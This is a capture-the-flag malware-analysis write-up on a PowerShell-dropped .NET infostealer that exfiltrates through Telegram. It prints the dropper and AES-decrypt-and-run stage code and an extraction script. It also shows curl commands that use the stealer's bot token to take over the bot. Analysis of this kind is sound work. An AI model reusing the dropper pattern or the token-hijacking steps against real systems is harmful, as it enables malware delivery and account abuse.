**Category**: Malware  
**Author**: Ben Folland

![](./files/02%20-%20Telestealer/02%20-%20Telestealer.png)

---

The challenge ZIP contained a single file named `telestealer` which turned out to be a PowerShell script:

```PowerShell
var parts = [];
parts.push('JGtleSAg...');
...
parts.push('YXRlRGVj...');
var b64cmd = parts.join('');
var shell = new ActiveXObject('WScript.Shell');
var cmd = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand ' + b64cmd;
shell.Run(cmd, 0, false);
```

It was building a base64 string, decoding it and executing a second stage, which looked like this:

```PowerShell
$key    = [Convert]::FromBase64String('36YQbGeO5yMKil1bWgZb491TLXv68qdTc4dBLIIbdzw=')
$iv     = [Convert]::FromBase64String('5g9YP4F0aHlBXK+G3DF5JA==')
$cipher = [Convert]::FromBase64String('4BA40iPA...');
$aes    = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV  = $iv
$dec    = $aes.CreateDecryptor()
$plain  = $dec.TransformFinalBlock($cipher, 0, $cipher.Length)
$out    = 'C:\Users\Public\Music\x.exe'
[IO.File]::WriteAllBytes($out, $plain)
Start-Process -FilePath $out
```

It then base64 decoded an AES key, IV and ciphertext, decrypted the ciphertext and output it to an executable file on disk.

I wrote a Python script to dump both the secondary stage as well as the final executable:

```Python
#!/usr/bin/env python3
import re
import base64
from Crypto.Cipher import AES

def main():
    data = open("telestealer").read()

    parts = re.findall(r"parts.push\('(.+?)'\)", data)
    parts = "".join(parts)
    parts = base64.b64decode(parts).decode()

    with open("stage2.ps1", "w") as fout:
        fout.write(parts)

    parts = re.findall(r"FromBase64String\('(.+?)'\)", parts)
    key, iv, ct = parts

    key = base64.b64decode(key)
    iv = base64.b64decode(iv)
    ct = base64.b64decode(ct)

    decryptor = AES.new(mode=AES.MODE_CBC, key=key, iv=iv)
    pt = decryptor.decrypt(ct)

    with open("telestealer.exe", "wb") as fout:
        fout.write(pt)
        
if __name__ == "__main__":
    main()
```

The final `telestaler.exe` was a .NET binary, so I loaded it in [dnSpy](https://github.com/dnSpy/dnSpy).

```
$ file telestealer.exe
telestealer.exe: PE32 executable for MS Windows 6.00 (GUI), Intel i386 Mono/.Net assembly, 3 sections
```

![](./files/02%20-%20Telestealer/01.png)

It looked like a generic infostealer, with `UltraSpeed` holding the majority of the important implementation details. I looked at the `ThePasswordVaultSenderTimerWithoutProtection` function and saw that it was checking three configuration settings:

- `#FTPEnabled`
- `#SMTPEnabled`
- `#TGEnabled`

Only `#TGEnabled` was set in this binary, which resulted in the following code being executed:

![](./files/02%20-%20Telestealer/02.png)

It was clearly using the Telegram bot API for data exfiltration. These were the `TG_Access` and `TG_Profileid` strings:

![](./files/02%20-%20Telestealer/03.png)

It turned out that Telegram was actually rather painful to work with. The API wasn't very well documented and a lot of features were locked behind having a premium subscription. I made myself an account and created my own chat, intending to add the bot to it. Before doing so, I needed to find the bot's username:

```
$ curl "https://api.telegram.org/bot8485770488:AAH8YOjqaRckDPIy7xNwZN2KcaLx6EME-L0/getMe"
{"ok":true,"result":{"id":8485770488,"is_bot":true,"first_name":"st3aler","username":"st38l3r_bot","can_join_groups":true,"can_read_all_group_messages":true,"supports_inline_queries":false,"can_connect_to_business":false,"has_main_web_app":false}}
```

The username was `st38l3r_bot`. It got tricky at this point becuse other people were doing basically the same thing that I was, so my messages to the bot were getting consumed by others' API requests, and retrieving past messages seemingly wasn't possible. Eventually I got lucky:

![](./files/02%20-%20Telestealer/04.png)

```
$ curl "https://api.telegram.org/bot8485770488:AAH8YOjqaRckDPIy7xNwZN2KcaLx6EME-L0/getUpdates"
{"ok":true,"result":[{"update_id":550898511,
"message":{"message_id":2409,"from":{"id":<redacted>,"is_bot":false,"first_name":"<redacted>","last_name":"<redacted>","language_code":"en"},"chat":{"id":<redacted>,"title":"<redacted>","type":"group","all_members_are_administrators":true,"accepted_gift_types":{"unlimited_gifts":false,"limited_gifts":false,"unique_gifts":false,"premium_subscription":false}},"date":1761676549,"text":"@st38l3r_bot hey idiot","entities":[{"offset":0,"length":12,"type":"mention"}]}}]}
```

This gave me the ID of the chat I had created and added the bot to. From here I was able to send messages as the bot:

```
$ curl "https://api.telegram.org/bot8485770488:AAH8YOjqaRckDPIy7xNwZN2KcaLx6EME-L0/sendMessage" -d "chat_id=<redacted>" -d "text=Beep boop, I'm a bot."
{"ok":true,"result":{"message_id":2609,"from":{"id":8485770488,"is_bot":true,"first_name":"st3aler","username":"st38l3r_bot"},"chat":{"id":<redacted>,"title":"<redacted>","type":"group","all_members_are_administrators":true,"accepted_gift_types":{"unlimited_gifts":false,"limited_gifts":false,"unique_gifts":false,"premium_subscription":false}},"date":1761677755,"text":"Beep boop, I'm a bot."}}
```

![](./files/02%20-%20Telestealer/05.png)

At this point, some jerk decided to abuse the bot's capabilities to delete the message with the flag in it.

The original solution was to use the `/forwardMessage` endpoint to enumerate all messages from the bot's private chat and forward them to your own, which would result in the flag being sent to your private chat when you forwarded the message with ID 5.

![](./files/02%20-%20Telestealer/06.png)

---

Starting all over again, the dumping process was identical to what I already described. The primary change was in the .NET payload:

![](./files/02%20-%20Telestealer/07.png)

Now instead of interacting with the Telegram API, I simply had to interact with the bot itself:

![](./files/02%20-%20Telestealer/08.png)

Flag: **flag{5f5b173825732f5404acf2f680057153}**

---

**Files:**
- [extract.py](./files//02%20-%20Telestealer/extract.py)
- [stage2.ps1](./files//02%20-%20Telestealer/stage2.ps1)
- [telestealer](./files//02%20-%20Telestealer/telestealer)
- [telestealer.exe](./files//02%20-%20Telestealer/telestealer.exe)
- [telestealer.zip](./files//02%20-%20Telestealer/telestealer.zip)